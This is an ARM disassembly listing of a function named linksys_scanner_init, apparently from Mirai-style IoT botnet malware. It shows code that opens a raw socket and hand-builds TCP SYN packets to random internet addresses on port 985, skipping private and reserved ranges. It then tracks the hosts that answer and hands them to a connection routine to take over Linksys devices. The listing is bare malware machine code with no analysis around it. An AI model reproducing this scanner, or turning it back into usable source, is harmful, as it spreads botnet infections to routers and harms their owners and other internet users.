   110b0:	e1a0c004 	mov	ip, r4
   110b4:	e59fe9ec 	ldr	lr, [pc, #2540]	; 11aa8 <linksys_scanner_init+0xa80>
   110b8:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   110bc:	e59e0000 	ldr	r0, [lr]
   110c0:	e1a0260c 	lsl	r2, ip, #12
   110c4:	e042250c 	sub	r2, r2, ip, lsl #10
   110c8:	e1a01603 	lsl	r1, r3, #12
   110cc:	e283c001 	add	ip, r3, #1
   110d0:	e0411503 	sub	r1, r1, r3, lsl #10
   110d4:	e0822000 	add	r2, r2, r0
   110d8:	e3a05000 	mov	r5, #0
   110dc:	e3e03000 	mvn	r3, #0
   110e0:	e35c00ff 	cmp	ip, #255	; 0xff
   110e4:	e7813000 	str	r3, [r1, r0]
   110e8:	e5825008 	str	r5, [r2, #8]
   110ec:	e58dc724 	str	ip, [sp, #1828]	; 0x724
   110f0:	daffffef 	ble	110b4 <linksys_scanner_init+0x8c>
   110f4:	e3a01003 	mov	r1, #3
   110f8:	e3a00002 	mov	r0, #2
   110fc:	e3a02006 	mov	r2, #6
   11100:	eb0017d3 	bl	17054 <__GI_socket>
   11104:	e59f19a0 	ldr	r1, [pc, #2464]	; 11aac <linksys_scanner_init+0xa84>
   11108:	e3700001 	cmn	r0, #1
   1110c:	e1a04000 	mov	r4, r0
   11110:	e5810000 	str	r0, [r1]
   11114:	0a000148 	beq	1163c <linksys_scanner_init+0x614>
   11118:	e3a01003 	mov	r1, #3
   1111c:	e1a02005 	mov	r2, r5
   11120:	eb0013a3 	bl	15fb4 <__GI___libc_fcntl>
   11124:	e3a01004 	mov	r1, #4
   11128:	e3802b02 	orr	r2, r0, #2048	; 0x800
   1112c:	e1a00004 	mov	r0, r4
   11130:	eb00139f 	bl	15fb4 <__GI___libc_fcntl>
   11134:	e28d3e72 	add	r3, sp, #1824	; 0x720
   11138:	e2833008 	add	r3, r3, #8
   1113c:	e3a02001 	mov	r2, #1
   11140:	e5232004 	str	r2, [r3, #-4]!
   11144:	e59f2960 	ldr	r2, [pc, #2400]	; 11aac <linksys_scanner_init+0xa84>
   11148:	e3a0c004 	mov	ip, #4
   1114c:	e5920000 	ldr	r0, [r2]
   11150:	e1a01005 	mov	r1, r5
   11154:	e3a02003 	mov	r2, #3
   11158:	e58dc000 	str	ip, [sp]
   1115c:	eb0017aa 	bl	1700c <__GI_setsockopt>
   11160:	e3500000 	cmp	r0, #0
   11164:	1a000131 	bne	11630 <linksys_scanner_init+0x608>
   11168:	eb000522 	bl	125f8 <rand_next>
   1116c:	e1a00800 	lsl	r0, r0, #16
   11170:	e1a0c820 	lsr	ip, r0, #16
   11174:	e20c30ff 	and	r3, ip, #255	; 0xff
   11178:	e1a00c20 	lsr	r0, r0, #24
   1117c:	e1800403 	orr	r0, r0, r3, lsl #8
   11180:	e3500b01 	cmp	r0, #1024	; 0x400
   11184:	e58dc014 	str	ip, [sp, #20]
   11188:	3afffff6 	bcc	11168 <linksys_scanner_init+0x140>
   1118c:	e59fe91c 	ldr	lr, [pc, #2332]	; 11ab0 <linksys_scanner_init+0xa88>
   11190:	e5de3000 	ldrb	r3, [lr]
   11194:	e3c3300a 	bic	r3, r3, #10
   11198:	e3833005 	orr	r3, r3, #5
   1119c:	e5ce3000 	strb	r3, [lr]
   111a0:	e5de2000 	ldrb	r2, [lr]
   111a4:	e3c220b0 	bic	r2, r2, #176	; 0xb0
   111a8:	e3822040 	orr	r2, r2, #64	; 0x40
   111ac:	e3a01b0a 	mov	r1, #10240	; 0x2800
   111b0:	e5ce2000 	strb	r2, [lr]
   111b4:	e1ce10b2 	strh	r1, [lr, #2]
   111b8:	eb00050e 	bl	125f8 <rand_next>
   111bc:	e59f28ec 	ldr	r2, [pc, #2284]	; 11ab0 <linksys_scanner_init+0xa88>
   111c0:	e282b014 	add	fp, r2, #20
   111c4:	e5db100c 	ldrb	r1, [fp, #12]
   111c8:	e3a03040 	mov	r3, #64	; 0x40
   111cc:	e5c23008 	strb	r3, [r2, #8]
   111d0:	e3c110a0 	bic	r1, r1, #160	; 0xa0
   111d4:	e59f38d4 	ldr	r3, [pc, #2260]	; 11ab0 <linksys_scanner_init+0xa88>
   111d8:	e1c200b4 	strh	r0, [r2, #4]
   111dc:	e3811050 	orr	r1, r1, #80	; 0x50
   111e0:	e3a02006 	mov	r2, #6
   111e4:	e3a0cff6 	mov	ip, #984	; 0x3d8
   111e8:	e5c32009 	strb	r2, [r3, #9]
   111ec:	e28cc001 	add	ip, ip, #1
   111f0:	e5cb100c 	strb	r1, [fp, #12]
   111f4:	e1cbc0b2 	strh	ip, [fp, #2]
   111f8:	e59dc014 	ldr	ip, [sp, #20]
   111fc:	e1c3c1b4 	strh	ip, [r3, #20]
   11200:	eb0004fc 	bl	125f8 <rand_next>
   11204:	e5db300d 	ldrb	r3, [fp, #13]
   11208:	e28de028 	add	lr, sp, #40	; 0x28
   1120c:	e3833002 	orr	r3, r3, #2
   11210:	e24ee00e 	sub	lr, lr, #14
   11214:	e5cb300d 	strb	r3, [fp, #13]
   11218:	e1cb00be 	strh	r0, [fp, #14]
   1121c:	e58de00c 	str	lr, [sp, #12]
   11220:	e59f187c 	ldr	r1, [pc, #2172]	; 11aa4 <linksys_scanner_init+0xa7c>
   11224:	e5918000 	ldr	r8, [r1]
   11228:	e1590008 	cmp	r9, r8
   1122c:	0a00009c 	beq	114a4 <linksys_scanner_init+0x47c>
   11230:	e3a03000 	mov	r3, #0
   11234:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   11238:	e3a03000 	mov	r3, #0
   1123c:	e58d3710 	str	r3, [sp, #1808]	; 0x710
   11240:	e58d3704 	str	r3, [sp, #1796]	; 0x704
   11244:	e58d3708 	str	r3, [sp, #1800]	; 0x708
   11248:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
   1124c:	eb0004e9 	bl	125f8 <rand_next>
   11250:	e59f2848 	ldr	r2, [pc, #2120]	; 11aa0 <linksys_scanner_init+0xa78>
   11254:	e59fc854 	ldr	ip, [pc, #2132]	; 11ab0 <linksys_scanner_init+0xa88>
   11258:	e5923000 	ldr	r3, [r2]
   1125c:	e1cc00b4 	strh	r0, [ip, #4]
   11260:	e58c300c 	str	r3, [ip, #12]
   11264:	eb0004e3 	bl	125f8 <rand_next>
   11268:	e20040ff 	and	r4, r0, #255	; 0xff
   1126c:	e1a03420 	lsr	r3, r0, #8
   11270:	e1a02820 	lsr	r2, r0, #16
   11274:	e3540000 	cmp	r4, #0
   11278:	1354007f 	cmpne	r4, #127	; 0x7f
   1127c:	e20350ff 	and	r5, r3, #255	; 0xff
   11280:	e20270ff 	and	r7, r2, #255	; 0xff
   11284:	e1a06c20 	lsr	r6, r0, #24
   11288:	0afffff5 	beq	11264 <linksys_scanner_init+0x23c>
   1128c:	e3540003 	cmp	r4, #3
   11290:	0afffff3 	beq	11264 <linksys_scanner_init+0x23c>
   11294:	e244300f 	sub	r3, r4, #15
   11298:	e3540038 	cmp	r4, #56	; 0x38
   1129c:	13530001 	cmpne	r3, #1
   112a0:	9affffef 	bls	11264 <linksys_scanner_init+0x23c>
   112a4:	e354000a 	cmp	r4, #10
   112a8:	0affffed 	beq	11264 <linksys_scanner_init+0x23c>
   112ac:	e35400c0 	cmp	r4, #192	; 0xc0
   112b0:	035500a8 	cmpeq	r5, #168	; 0xa8
   112b4:	0affffea 	beq	11264 <linksys_scanner_init+0x23c>
   112b8:	e35400ac 	cmp	r4, #172	; 0xac
   112bc:	13a03000 	movne	r3, #0
   112c0:	03a03001 	moveq	r3, #1
   112c4:	e355000f 	cmp	r5, #15
   112c8:	93a03000 	movls	r3, #0
   112cc:	e3530000 	cmp	r3, #0
   112d0:	0a000001 	beq	112dc <linksys_scanner_init+0x2b4>
   112d4:	e355001f 	cmp	r5, #31
   112d8:	9affffe1 	bls	11264 <linksys_scanner_init+0x23c>
   112dc:	e3540064 	cmp	r4, #100	; 0x64
   112e0:	13a03000 	movne	r3, #0
   112e4:	03a03001 	moveq	r3, #1
   112e8:	e355003f 	cmp	r5, #63	; 0x3f
   112ec:	93a03000 	movls	r3, #0
   112f0:	e3530000 	cmp	r3, #0
   112f4:	0a000001 	beq	11300 <linksys_scanner_init+0x2d8>
   112f8:	e355007e 	cmp	r5, #126	; 0x7e
   112fc:	9affffd8 	bls	11264 <linksys_scanner_init+0x23c>
   11300:	e35400a9 	cmp	r4, #169	; 0xa9
   11304:	035500ff 	cmpeq	r5, #255	; 0xff
   11308:	0affffd5 	beq	11264 <linksys_scanner_init+0x23c>
   1130c:	e35400c6 	cmp	r4, #198	; 0xc6
   11310:	13a03000 	movne	r3, #0
   11314:	03a03001 	moveq	r3, #1
   11318:	e3550011 	cmp	r5, #17
   1131c:	93a03000 	movls	r3, #0
   11320:	e3530000 	cmp	r3, #0
   11324:	0a000001 	beq	11330 <linksys_scanner_init+0x308>
   11328:	e3550013 	cmp	r5, #19
   1132c:	9affffcc 	bls	11264 <linksys_scanner_init+0x23c>
   11330:	e35400df 	cmp	r4, #223	; 0xdf
   11334:	8affffca 	bhi	11264 <linksys_scanner_init+0x23c>
   11338:	e2443006 	sub	r3, r4, #6
   1133c:	e354000b 	cmp	r4, #11
   11340:	13530001 	cmpne	r3, #1
   11344:	9affffc6 	bls	11264 <linksys_scanner_init+0x23c>
   11348:	e3540016 	cmp	r4, #22
   1134c:	13540015 	cmpne	r4, #21
   11350:	0affffc3 	beq	11264 <linksys_scanner_init+0x23c>
   11354:	e354001c 	cmp	r4, #28
   11358:	1354001a 	cmpne	r4, #26
   1135c:	0affffc0 	beq	11264 <linksys_scanner_init+0x23c>
   11360:	e354001e 	cmp	r4, #30
   11364:	1354001d 	cmpne	r4, #29
   11368:	0affffbd 	beq	11264 <linksys_scanner_init+0x23c>
   1136c:	e3540037 	cmp	r4, #55	; 0x37
   11370:	13540021 	cmpne	r4, #33	; 0x21
   11374:	0affffba 	beq	11264 <linksys_scanner_init+0x23c>
   11378:	e35400d7 	cmp	r4, #215	; 0xd7
   1137c:	135400d6 	cmpne	r4, #214	; 0xd6
   11380:	0affffb7 	beq	11264 <linksys_scanner_init+0x23c>
   11384:	eb001cd6 	bl	186e4 <rand>
   11388:	e59f3724 	ldr	r3, [pc, #1828]	; 11ab4 <linksys_scanner_init+0xa8c>
   1138c:	e0c2e093 	smull	lr, r2, r3, r0
   11390:	e0422fc0 	sub	r2, r2, r0, asr #31
   11394:	e1a03082 	lsl	r3, r2, #1
   11398:	e0833002 	add	r3, r3, r2
   1139c:	e0502003 	subs	r2, r0, r3
   113a0:	0386332b 	orreq	r3, r6, #-1409286144	; 0xac000000
   113a4:	01833805 	orreq	r3, r3, r5, lsl #16
   113a8:	0a0000ec 	beq	11760 <linksys_scanner_init+0x738>
   113ac:	e3520001 	cmp	r2, #1
   113b0:	03863462 	orreq	r3, r6, #1644167168	; 0x62000000
   113b4:	01833805 	orreq	r3, r3, r5, lsl #16
   113b8:	0a0000e8 	beq	11760 <linksys_scanner_init+0x738>
   113bc:	e3520002 	cmp	r2, #2
   113c0:	0386332e 	orreq	r3, r6, #-1207959552	; 0xb8000000
   113c4:	01833805 	orreq	r3, r3, r5, lsl #16
   113c8:	0a0000e4 	beq	11760 <linksys_scanner_init+0x738>
   113cc:	e3520003 	cmp	r2, #3
   113d0:	03863446 	orreq	r3, r6, #1174405120	; 0x46000000
   113d4:	01833805 	orreq	r3, r3, r5, lsl #16
   113d8:	0a0000e0 	beq	11760 <linksys_scanner_init+0x738>
   113dc:	e3520004 	cmp	r2, #4
   113e0:	0a0000db 	beq	11754 <linksys_scanner_init+0x72c>
   113e4:	e59f06c4 	ldr	r0, [pc, #1732]	; 11ab0 <linksys_scanner_init+0xa88>
   113e8:	e59d2010 	ldr	r2, [sp, #16]
   113ec:	e3a03000 	mov	r3, #0
   113f0:	e3a01014 	mov	r1, #20
   113f4:	e5802010 	str	r2, [r0, #16]
   113f8:	e1c030ba 	strh	r3, [r0, #10]
   113fc:	ebfff51b 	bl	e870 <checksum_generic>
   11400:	e59fc6a8 	ldr	ip, [pc, #1704]	; 11ab0 <linksys_scanner_init+0xa88>
   11404:	e59ce010 	ldr	lr, [ip, #16]
   11408:	e1cc00ba 	strh	r0, [ip, #10]
   1140c:	e1a0000c 	mov	r0, ip
   11410:	e3a0cff6 	mov	ip, #984	; 0x3d8
   11414:	e28cc001 	add	ip, ip, #1
   11418:	e58be004 	str	lr, [fp, #4]
   1141c:	e3a0e000 	mov	lr, #0
   11420:	e2801014 	add	r1, r0, #20
   11424:	e3a02b05 	mov	r2, #5120	; 0x1400
   11428:	e3a03014 	mov	r3, #20
   1142c:	e1cbc0b2 	strh	ip, [fp, #2]
   11430:	e1cbe1b0 	strh	lr, [fp, #16]
   11434:	ebfff521 	bl	e8c0 <checksum_tcpudp>
   11438:	e59f2670 	ldr	r2, [pc, #1648]	; 11ab0 <linksys_scanner_init+0xa88>
   1143c:	e59f1668 	ldr	r1, [pc, #1640]	; 11aac <linksys_scanner_init+0xa84>
   11440:	e592e010 	ldr	lr, [r2, #16]
   11444:	e3a0c010 	mov	ip, #16
   11448:	e5913000 	ldr	r3, [r1]
   1144c:	e1cb01b0 	strh	r0, [fp, #16]
   11450:	e58de708 	str	lr, [sp, #1800]	; 0x708
   11454:	e58dc004 	str	ip, [sp, #4]
   11458:	e3a0e002 	mov	lr, #2
   1145c:	e28dcc07 	add	ip, sp, #1792	; 0x700
   11460:	e1cce0b4 	strh	lr, [ip, #4]
   11464:	e1dbe0b2 	ldrh	lr, [fp, #2]
   11468:	e1cce0b6 	strh	lr, [ip, #6]
   1146c:	e28dcc07 	add	ip, sp, #1792	; 0x700
   11470:	e1a00003 	mov	r0, r3
   11474:	e1a01002 	mov	r1, r2
   11478:	e3a03901 	mov	r3, #16384	; 0x4000
   1147c:	e28cc004 	add	ip, ip, #4
   11480:	e3a02028 	mov	r2, #40	; 0x28
   11484:	e58dc000 	str	ip, [sp]
   11488:	eb0016bd 	bl	16f84 <__libc_sendto>
   1148c:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   11490:	e2833001 	add	r3, r3, #1
   11494:	e3530b01 	cmp	r3, #1024	; 0x400
   11498:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   1149c:	baffff65 	blt	11238 <linksys_scanner_init+0x210>
   114a0:	e1a09008 	mov	r9, r8
   114a4:	eb0014eb 	bl	16858 <__GI___errno_location>
   114a8:	e59de00c 	ldr	lr, [sp, #12]
   114ac:	e1a0a000 	mov	sl, r0
   114b0:	e28e4014 	add	r4, lr, #20
   114b4:	e3a05000 	mov	r5, #0
   114b8:	e3a0c000 	mov	ip, #0
   114bc:	e58ac000 	str	ip, [sl]
   114c0:	e59f15e4 	ldr	r1, [pc, #1508]	; 11aac <linksys_scanner_init+0xa84>
   114c4:	e3a02e5e 	mov	r2, #1504	; 0x5e0
   114c8:	e5910000 	ldr	r0, [r1]
   114cc:	e282200a 	add	r2, r2, #10
   114d0:	e59d100c 	ldr	r1, [sp, #12]
   114d4:	e3a03901 	mov	r3, #16384	; 0x4000
   114d8:	e58dc004 	str	ip, [sp, #4]
   114dc:	e58dc000 	str	ip, [sp]
   114e0:	eb001645 	bl	16dfc <__libc_recvfrom>
   114e4:	e3500000 	cmp	r0, #0
   114e8:	da000055 	ble	11644 <linksys_scanner_init+0x61c>
   114ec:	e59a3000 	ldr	r3, [sl]
   114f0:	e353000b 	cmp	r3, #11
   114f4:	0a000052 	beq	11644 <linksys_scanner_init+0x61c>
   114f8:	e3500027 	cmp	r0, #39	; 0x27
   114fc:	9affffed 	bls	114b8 <linksys_scanner_init+0x490>
   11500:	e59d300c 	ldr	r3, [sp, #12]
   11504:	e59fc594 	ldr	ip, [pc, #1428]	; 11aa0 <linksys_scanner_init+0xa78>
   11508:	e5932010 	ldr	r2, [r3, #16]
   1150c:	e59c3000 	ldr	r3, [ip]
   11510:	e1520003 	cmp	r2, r3
   11514:	1affffe7 	bne	114b8 <linksys_scanner_init+0x490>
   11518:	e59de00c 	ldr	lr, [sp, #12]
   1151c:	e5de3009 	ldrb	r3, [lr, #9]
   11520:	e3530006 	cmp	r3, #6
   11524:	1affffe3 	bne	114b8 <linksys_scanner_init+0x490>
   11528:	e3a03ff6 	mov	r3, #984	; 0x3d8
   1152c:	e1d4e0b0 	ldrh	lr, [r4]
   11530:	e2833001 	add	r3, r3, #1
   11534:	e15e0003 	cmp	lr, r3
   11538:	1affffde 	bne	114b8 <linksys_scanner_init+0x490>
   1153c:	e1d430b2 	ldrh	r3, [r4, #2]
   11540:	e59d1014 	ldr	r1, [sp, #20]
   11544:	e1530001 	cmp	r3, r1
   11548:	1affffda 	bne	114b8 <linksys_scanner_init+0x490>
   1154c:	e5d4300d 	ldrb	r3, [r4, #13]
   11550:	e3130002 	tst	r3, #2
   11554:	0affffd7 	beq	114b8 <linksys_scanner_init+0x490>
   11558:	e3130010 	tst	r3, #16
   1155c:	0affffd5 	beq	114b8 <linksys_scanner_init+0x490>
   11560:	e3130004 	tst	r3, #4
   11564:	1affffd3 	bne	114b8 <linksys_scanner_init+0x490>
   11568:	e3130001 	tst	r3, #1
   1156c:	1affffd1 	bne	114b8 <linksys_scanner_init+0x490>
   11570:	e5941008 	ldr	r1, [r4, #8]
   11574:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
   11578:	e1a02c21 	lsr	r2, r1, #24
   1157c:	e2013cff 	and	r3, r1, #65280	; 0xff00
   11580:	e1822420 	orr	r2, r2, r0, lsr #8
   11584:	e1822403 	orr	r2, r2, r3, lsl #8
   11588:	e1822c01 	orr	r2, r2, r1, lsl #24
   1158c:	e2422001 	sub	r2, r2, #1
   11590:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
   11594:	e1a03c22 	lsr	r3, r2, #24
   11598:	e2021cff 	and	r1, r2, #65280	; 0xff00
   1159c:	e1833420 	orr	r3, r3, r0, lsr #8
   115a0:	e1833401 	orr	r3, r3, r1, lsl #8
   115a4:	e59d100c 	ldr	r1, [sp, #12]
   115a8:	e591c00c 	ldr	ip, [r1, #12]
   115ac:	e1833c02 	orr	r3, r3, r2, lsl #24
   115b0:	e153000c 	cmp	r3, ip
   115b4:	1affffbf 	bne	114b8 <linksys_scanner_init+0x490>
   115b8:	e35500ff 	cmp	r5, #255	; 0xff
   115bc:	ca000020 	bgt	11644 <linksys_scanner_init+0x61c>
   115c0:	e59f24e0 	ldr	r2, [pc, #1248]	; 11aa8 <linksys_scanner_init+0xa80>
   115c4:	e1a03605 	lsl	r3, r5, #12
   115c8:	e5921000 	ldr	r1, [r2]
   115cc:	e0433505 	sub	r3, r3, r5, lsl #10
   115d0:	e0830001 	add	r0, r3, r1
   115d4:	e5902008 	ldr	r2, [r0, #8]
   115d8:	e3520000 	cmp	r2, #0
   115dc:	12852001 	addne	r2, r5, #1
   115e0:	11a03602 	lslne	r3, r2, #12
   115e4:	10433502 	subne	r3, r3, r2, lsl #10
   115e8:	10813003 	addne	r3, r1, r3
   115ec:	11a02005 	movne	r2, r5
   115f0:	0a000008 	beq	11618 <linksys_scanner_init+0x5f0>
   115f4:	e2822001 	add	r2, r2, #1
   115f8:	e3520c01 	cmp	r2, #256	; 0x100
   115fc:	0a000010 	beq	11644 <linksys_scanner_init+0x61c>
   11600:	e1a00003 	mov	r0, r3
   11604:	e5933008 	ldr	r3, [r3, #8]
   11608:	e3530000 	cmp	r3, #0
   1160c:	e2803b03 	add	r3, r0, #3072	; 0xc00
   11610:	1afffff7 	bne	115f4 <linksys_scanner_init+0x5cc>
   11614:	e1a05002 	mov	r5, r2
   11618:	e3500000 	cmp	r0, #0
   1161c:	0a000008 	beq	11644 <linksys_scanner_init+0x61c>
   11620:	e580c00c 	str	ip, [r0, #12]
   11624:	e1c0e1b0 	strh	lr, [r0, #16]
   11628:	ebfffe49 	bl	10f54 <linksys_setup_connection>
   1162c:	eaffffa1 	b	114b8 <linksys_scanner_init+0x490>
   11630:	e59f3474 	ldr	r3, [pc, #1140]	; 11aac <linksys_scanner_init+0xa84>
   11634:	e5930000 	ldr	r0, [r3]
   11638:	eb002200 	bl	19e40 <__GI___libc_close>
   1163c:	e1a00005 	mov	r0, r5
   11640:	eb001e35 	bl	18f1c <__GI_exit>
   11644:	e3a03000 	mov	r3, #0
   11648:	e58d3684 	str	r3, [sp, #1668]	; 0x684
   1164c:	e3a02004 	mov	r2, #4
   11650:	e282cd1a 	add	ip, r2, #1664	; 0x680
   11654:	e2822004 	add	r2, r2, #4
   11658:	e3a03000 	mov	r3, #0
   1165c:	e28cc004 	add	ip, ip, #4
   11660:	e3520080 	cmp	r2, #128	; 0x80
   11664:	e78c300d 	str	r3, [ip, sp]
   11668:	1afffff8 	bne	11650 <linksys_scanner_init+0x628>
   1166c:	e58d3604 	str	r3, [sp, #1540]	; 0x604
   11670:	e2833004 	add	r3, r3, #4
   11674:	e283ec06 	add	lr, r3, #1536	; 0x600
   11678:	e2833004 	add	r3, r3, #4
   1167c:	e3a02000 	mov	r2, #0
   11680:	e28ee004 	add	lr, lr, #4
   11684:	e3530080 	cmp	r3, #128	; 0x80
   11688:	e78e200d 	str	r2, [lr, sp]
   1168c:	1afffff8 	bne	11674 <linksys_scanner_init+0x64c>
   11690:	e1a07002 	mov	r7, r2
   11694:	e1a08002 	mov	r8, r2
   11698:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   1169c:	ea000014 	b	116f4 <linksys_scanner_init+0x6cc>
   116a0:	e2413001 	sub	r3, r1, #1
   116a4:	e3530002 	cmp	r3, #2
   116a8:	8a000035 	bhi	11784 <linksys_scanner_init+0x75c>
   116ac:	e795c006 	ldr	ip, [r5, r6]
   116b0:	e28d3e72 	add	r3, sp, #1824	; 0x720
   116b4:	e1a022ac 	lsr	r2, ip, #5
   116b8:	e2833008 	add	r3, r3, #8
   116bc:	e1a02102 	lsl	r2, r2, #2
   116c0:	e0822003 	add	r2, r2, r3
   116c4:	e5121124 	ldr	r1, [r2, #-292]	; 0xfffffedc
   116c8:	e20c001f 	and	r0, ip, #31
   116cc:	e3a03001 	mov	r3, #1
   116d0:	e1811013 	orr	r1, r1, r3, lsl r0
   116d4:	e15c0008 	cmp	ip, r8
   116d8:	e5021124 	str	r1, [r2, #-292]	; 0xfffffedc
   116dc:	c1a0800c 	movgt	r8, ip
   116e0:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   116e4:	e2832001 	add	r2, r3, #1
   116e8:	e35200ff 	cmp	r2, #255	; 0xff
   116ec:	e58d2724 	str	r2, [sp, #1828]	; 0x724
   116f0:	ca000031 	bgt	117bc <linksys_scanner_init+0x794>
   116f4:	e59f13ac 	ldr	r1, [pc, #940]	; 11aa8 <linksys_scanner_init+0xa80>
   116f8:	e1a03602 	lsl	r3, r2, #12
   116fc:	e5916000 	ldr	r6, [r1]
   11700:	e0435502 	sub	r5, r3, r2, lsl #10
   11704:	e0854006 	add	r4, r5, r6
   11708:	e5941008 	ldr	r1, [r4, #8]
   1170c:	e3510000 	cmp	r1, #0
   11710:	0afffff2 	beq	116e0 <linksys_scanner_init+0x6b8>
   11714:	e59f2388 	ldr	r2, [pc, #904]	; 11aa4 <linksys_scanner_init+0xa7c>
   11718:	e5923000 	ldr	r3, [r2]
   1171c:	e5942004 	ldr	r2, [r4, #4]
   11720:	e0623003 	rsb	r3, r2, r3
   11724:	e3530005 	cmp	r3, #5
   11728:	9affffdc 	bls	116a0 <linksys_scanner_init+0x678>
   1172c:	e7950006 	ldr	r0, [r5, r6]
   11730:	eb0021c2 	bl	19e40 <__GI___libc_close>
   11734:	e3e03000 	mvn	r3, #0
   11738:	e3a02000 	mov	r2, #0
   1173c:	e7853006 	str	r3, [r5, r6]
   11740:	e5842008 	str	r2, [r4, #8]
   11744:	e2840018 	add	r0, r4, #24
   11748:	e3a01b01 	mov	r1, #1024	; 0x400
   1174c:	eb000d1a 	bl	14bbc <util_zero>
   11750:	eaffffe2 	b	116e0 <linksys_scanner_init+0x6b8>
   11754:	e1a03805 	lsl	r3, r5, #16
   11758:	e1833c04 	orr	r3, r3, r4, lsl #24
   1175c:	e1833006 	orr	r3, r3, r6
   11760:	e1833407 	orr	r3, r3, r7, lsl #8
   11764:	e20308ff 	and	r0, r3, #16711680	; 0xff0000
   11768:	e1a02c23 	lsr	r2, r3, #24
   1176c:	e2031cff 	and	r1, r3, #65280	; 0xff00
   11770:	e1822420 	orr	r2, r2, r0, lsr #8
   11774:	e1822401 	orr	r2, r2, r1, lsl #8
   11778:	e1823c03 	orr	r3, r2, r3, lsl #24
   1177c:	e58d3010 	str	r3, [sp, #16]
   11780:	eaffff17 	b	113e4 <linksys_scanner_init+0x3bc>
   11784:	e795c006 	ldr	ip, [r5, r6]
   11788:	e28dee72 	add	lr, sp, #1824	; 0x720
   1178c:	e1a032ac 	lsr	r3, ip, #5
   11790:	e1a03103 	lsl	r3, r3, #2
   11794:	e28ee008 	add	lr, lr, #8
   11798:	e083300e 	add	r3, r3, lr
   1179c:	e51320a4 	ldr	r2, [r3, #-164]	; 0xffffff5c
   117a0:	e20c001f 	and	r0, ip, #31
   117a4:	e3a01001 	mov	r1, #1
   117a8:	e1822011 	orr	r2, r2, r1, lsl r0
   117ac:	e157000c 	cmp	r7, ip
   117b0:	b1a0700c 	movlt	r7, ip
   117b4:	e50320a4 	str	r2, [r3, #-164]	; 0xffffff5c
   117b8:	eaffffc8 	b	116e0 <linksys_scanner_init+0x6b8>
   117bc:	e3a0c001 	mov	ip, #1
   117c0:	e3a04000 	mov	r4, #0
   117c4:	e58dc714 	str	ip, [sp, #1812]	; 0x714
   117c8:	e1580007 	cmp	r8, r7
   117cc:	a1a00008 	movge	r0, r8
   117d0:	b1a00007 	movlt	r0, r7
   117d4:	e28d1d1a 	add	r1, sp, #1664	; 0x680
   117d8:	e28d2c06 	add	r2, sp, #1536	; 0x600
   117dc:	e28dce71 	add	ip, sp, #1808	; 0x710
   117e0:	e28cc004 	add	ip, ip, #4
   117e4:	e2811004 	add	r1, r1, #4
   117e8:	e2822004 	add	r2, r2, #4
   117ec:	e1a03004 	mov	r3, r4
   117f0:	e2800001 	add	r0, r0, #1
   117f4:	e58dc000 	str	ip, [sp]
   117f8:	e58d4718 	str	r4, [sp, #1816]	; 0x718
   117fc:	eb0012a6 	bl	1629c <__libc_select>
   11800:	e1a00004 	mov	r0, r4
   11804:	eb0012f8 	bl	163ec <__GI_time>
   11808:	e59fe294 	ldr	lr, [pc, #660]	; 11aa4 <linksys_scanner_init+0xa7c>
   1180c:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   11810:	e58e0000 	str	r0, [lr]
   11814:	ea00000b 	b	11848 <linksys_scanner_init+0x820>
   11818:	e28dee72 	add	lr, sp, #1824	; 0x720
   1181c:	e28ee008 	add	lr, lr, #8
   11820:	e081200e 	add	r2, r1, lr
   11824:	e51230a4 	ldr	r3, [r2, #-164]	; 0xffffff5c
   11828:	e1a03453 	asr	r3, r3, r4
   1182c:	e3130001 	tst	r3, #1
   11830:	1a00003f 	bne	11934 <linksys_scanner_init+0x90c>
   11834:	e59d3724 	ldr	r3, [sp, #1828]	; 0x724
   11838:	e2834001 	add	r4, r3, #1
   1183c:	e35400ff 	cmp	r4, #255	; 0xff
   11840:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   11844:	cafffe75 	bgt	11220 <linksys_scanner_init+0x1f8>
   11848:	e59f1258 	ldr	r1, [pc, #600]	; 11aa8 <linksys_scanner_init+0xa80>
   1184c:	e1a03604 	lsl	r3, r4, #12
   11850:	e5918000 	ldr	r8, [r1]
   11854:	e0437504 	sub	r7, r3, r4, lsl #10
   11858:	e7970008 	ldr	r0, [r7, r8]
   1185c:	e3700001 	cmn	r0, #1
   11860:	e0876008 	add	r6, r7, r8
   11864:	0afffff2 	beq	11834 <linksys_scanner_init+0x80c>
   11868:	e1a022a0 	lsr	r2, r0, #5
   1186c:	e28d3e72 	add	r3, sp, #1824	; 0x720
   11870:	e2833008 	add	r3, r3, #8
   11874:	e1a01102 	lsl	r1, r2, #2
   11878:	e0812003 	add	r2, r1, r3
   1187c:	e5123124 	ldr	r3, [r2, #-292]	; 0xfffffedc
   11880:	e200401f 	and	r4, r0, #31
   11884:	e1a03453 	asr	r3, r3, r4
   11888:	e3130001 	tst	r3, #1
   1188c:	0affffe1 	beq	11818 <linksys_scanner_init+0x7f0>
   11890:	e3a0c004 	mov	ip, #4
   11894:	e1a0200c 	mov	r2, ip
   11898:	e58dc71c 	str	ip, [sp, #1820]	; 0x71c
   1189c:	e28dce71 	add	ip, sp, #1808	; 0x710
   118a0:	e28d3e72 	add	r3, sp, #1824	; 0x720
   118a4:	e28cc00c 	add	ip, ip, #12
   118a8:	e3a04000 	mov	r4, #0
   118ac:	e3a01001 	mov	r1, #1
   118b0:	e58d4720 	str	r4, [sp, #1824]	; 0x720
   118b4:	e58dc000 	str	ip, [sp]
   118b8:	eb0014ee 	bl	16c78 <getsockopt>
   118bc:	e59d3720 	ldr	r3, [sp, #1824]	; 0x720
   118c0:	e1900003 	orrs	r0, r0, r3
   118c4:	1a00006e 	bne	11a84 <linksys_scanner_init+0xa5c>
   118c8:	e5963008 	ldr	r3, [r6, #8]
   118cc:	e3530002 	cmp	r3, #2
   118d0:	0a000050 	beq	11a18 <linksys_scanner_init+0x9f0>
   118d4:	e3530003 	cmp	r3, #3
   118d8:	0a000069 	beq	11a84 <linksys_scanner_init+0xa5c>
   118dc:	e7973008 	ldr	r3, [r7, r8]
   118e0:	e1a022a3 	lsr	r2, r3, #5
   118e4:	e203401f 	and	r4, r3, #31
   118e8:	e1a01102 	lsl	r1, r2, #2
   118ec:	e3a03002 	mov	r3, #2
